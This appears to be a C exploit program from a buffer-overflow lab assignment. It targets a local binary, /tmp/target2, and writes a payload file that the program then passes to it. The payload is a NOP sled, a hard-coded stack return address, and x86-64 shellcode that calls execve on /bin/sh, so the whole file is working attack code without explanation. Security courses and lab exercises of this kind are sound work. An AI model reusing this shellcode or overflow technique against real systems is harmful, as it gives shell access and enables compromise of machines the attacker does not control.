#include <string.h>
#include <unistd.h>
#include <stdio.h>
#include "shellcode.h"
#include "write_xploit.h"

#define TARGET "/tmp/target2"
#define DEFAULT_OUTPUT "/tmp/xploit2_output"

#define NOP "\x90"

int main(int argc, char *argv[])
{
  char exploit[] = 
    NOP NOP NOP NOP NOP NOP NOP NOP
    "\x50\xeb\xff\xff\xff\x7f\x00\x00"
    NOP NOP NOP NOP NOP NOP NOP NOP
    NOP NOP NOP NOP NOP NOP NOP NOP
    NOP NOP NOP NOP NOP NOP NOP NOP
    NOP NOP NOP NOP NOP NOP NOP NOP
    "\x48\x31\xf6\x56\x48\xbf\x2f\x62"
    "\x69\x6e\x2f\x2f\x73\x68\x57\x54" 
    "\x5f\x6a\x3b\x58\x99\x0f\x05"    
    NOP                               
    NOP NOP NOP NOP NOP NOP NOP NOP
    NOP NOP NOP NOP NOP NOP NOP NOP
    NOP NOP NOP NOP NOP NOP NOP NOP
    NOP NOP NOP NOP NOP NOP NOP NOP
    NOP NOP NOP NOP NOP NOP NOP NOP
    NOP NOP NOP NOP NOP NOP NOP NOP
    NOP NOP NOP NOP NOP NOP NOP NOP
    "\x30";                           

  write_xploit(exploit, sizeof(exploit) - 1, DEFAULT_OUTPUT);

  char *args[] = { TARGET, DEFAULT_OUTPUT, NULL };
  char *env[] = { NULL };
  
  execve(TARGET, args, env);
  
  perror("execve failed");
  fprintf(stderr, "try running \"sudo make install\" in the targets directory\n");

  return 0;
}